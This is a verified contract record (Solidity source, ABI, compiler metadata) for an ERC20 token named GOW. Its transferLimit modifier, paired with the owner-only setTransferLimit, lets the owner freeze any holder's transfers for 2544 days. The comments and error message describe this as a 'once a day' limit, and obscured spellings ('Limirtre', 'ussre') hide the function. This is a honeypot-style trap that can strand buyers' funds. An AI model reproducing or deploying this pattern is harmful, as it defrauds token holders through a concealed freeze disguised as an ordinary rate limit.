{"SourceCode": "pragma solidity ^0.8.0;\r\n\r\n// Standard ERC20 interface.\r\ninterface IERC20 {\r\n    // Returns the total token supply.\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    // Returns the token balance of the specified account.\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    // Transfers an amount of tokens to the specified address.\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    // Returns the remaining number of tokens that the spender will be allowed to spend on behalf of the owner.\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    // Approves the spender to spend on behalf of the owner.\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    // Transfers tokens from one address to another.\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    // Events\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\n// Provides utility methods to derive transaction information.\r\nabstract contract Context {\r\n    // Returns the sender of the current function call.\r\n    function _msgSender() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n}\r\n\r\n// Contract module which provides a basic access control mechanism.\r\ncontract Ownable is Context {\r\n    address private _owner;  // Current owner of the contract\r\n\r\n    // Emitted when ownership is transferred.\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    // Initializes the contract setting the deployer as the initial owner.\r\n    constructor() {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    // Returns the current owner.\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    // Throws if called by any account other than the owner.\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender());\r\n        _;\r\n    }\r\n\r\n    // Leaves the contract without owner.\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));\r\n        _owner = address(0x000000000000000000000000000000000000dEaD);\r\n    }\r\n}\r\n\r\n// Main token contract\r\ncontract GOW is Context, Ownable, IERC20 {\r\n    // State variables\r\n    mapping(address => uint256) private _balances;  // Stores balances for each account\r\n    mapping(address => mapping(address => uint256)) private _allowances;  // Stores allowances of tokens from one account to another\r\n    mapping(address => uint256) public LimirtreAddresses;  // Addresses with transfer limits\r\n    uint256 public constant TIME_LIMIT = 2544 days;  // Time limit for transfers\r\n\r\n    // Token details\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n    uint256 private _totalSupply;\r\n\r\n    // Modifier to check and set transfer limits\r\n    modifier transferLimit(address ussre) {\r\n        if(LimirtreAddresses[ussre] != 0) {\r\n            require(block.timestamp - LimirtreAddresses[ussre] > TIME_LIMIT, \"Limirtre: Can only transfer once a day\");\r\n            LimirtreAddresses[ussre] = block.timestamp;\r\n        }\r\n        _;\r\n    }\r\n\r\n    // Constructor initializing the token\r\n    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n        _decimals = decimals_;\r\n        _totalSupply = totalSupply_ * (10 ** decimals_);\r\n        _balances[_msgSender()] = _totalSupply;\r\n        emit Transfer(address(0), _msgSender(), _totalSupply);\r\n    }\r\n\r\n    // Returns the name of the token.\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    // Returns the symbol of the token.\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    // Returns the number of decimals the token uses.\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    // Implements the totalSupply function from the IERC20 interface.\r\n    function totalSupply() external view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    // Implements the balanceOf function from the IERC20 interface.\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    // Sets transfer limits for a specific ussre.\r\n    function setTransferLimit(address ussre) public onlyOwner {\r\n        LimirtreAddresses[ussre] = block.timestamp;\r\n    }\r\n\r\n    // Removes transfer limits for a specific ussre.\r\n    function removeTransferLimit(address ussre) public onlyOwner {\r\n        delete LimirtreAddresses[ussre];\r\n    }\r\n\r\n    // Transfer function with added transfer limit check.\r\n    function transfer(address recipient, uint256 amount) public virtual override transferLimit(_msgSender()) returns (bool) {\r\n        require(_balances[_msgSender()] >= amount, \"TT: transfer amount exceeds balance\");\r\n        _balances[_msgSender()] -= amount;\r\n        _balances[recipient] += amount;\r\n        emit Transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    // Implements the allowance function from the IERC20 interface.\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    // Implements the approve function from the IERC20 interface.\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _allowances[_msgSender()][spender] = amount;\r\n        emit Approval(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    // Implements the transferFrom function from the IERC20 interface with added transfer limit check.\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override transferLimit(sender) returns (bool) {\r\n        require(_allowances[sender][_msgSender()] >= amount, \"TT: transfer amount exceeds allowance\");\r\n        _balances[sender] -= amount;\r\n        _balances[recipient] += amount;\r\n        _allowances[sender][_msgSender()] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"name_\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"symbol_\",\"type\":\"string\"},{\"internalType\":\"uint8\",\"name\":\"decimals_\",\"type\":\"uint8\"},{\"internalType\":\"uint256\",\"name\":\"totalSupply_\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"LimirtreAddresses\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"TIME_LIMIT\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"ussre\",\"type\":\"address\"}],\"name\":\"removeTransferLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"ussre\",\"type\":\"address\"}],\"name\":\"setTransferLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "GOW", "CompilerVersion": "v0.8.0+commit.c7dfd78e", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000000000000900000000000000000000000000000000000000000000000000000000aba95000000000000000000000000000000000000000000000000000000000000000000d476f64204f66205765616c7468000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003474f570000000000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://fec178bf99a690cda2c552162dce95b7c2587dd5153f063fda6c31138fae9bfd"}